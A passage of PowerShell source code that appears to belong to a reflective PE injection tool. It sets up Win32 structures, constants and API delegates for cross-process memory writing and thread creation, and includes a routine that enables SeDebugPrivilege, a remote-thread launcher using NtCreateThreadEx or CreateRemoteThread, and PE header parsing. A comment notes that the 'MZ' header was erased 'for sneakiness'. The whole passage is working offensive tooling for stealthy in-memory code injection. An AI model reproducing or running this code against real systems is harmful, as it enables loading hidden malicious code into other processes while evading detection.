		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		$NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
		[IntPtr]
		$EndAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
		[IntPtr]$FinalEndAddress = [IntPtr]::Zero
		if ($PsCmdlet.ParameterSetName -eq "Size")
		{
			[IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		}
		else
		{
			$FinalEndAddress = $EndAddress
		}
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
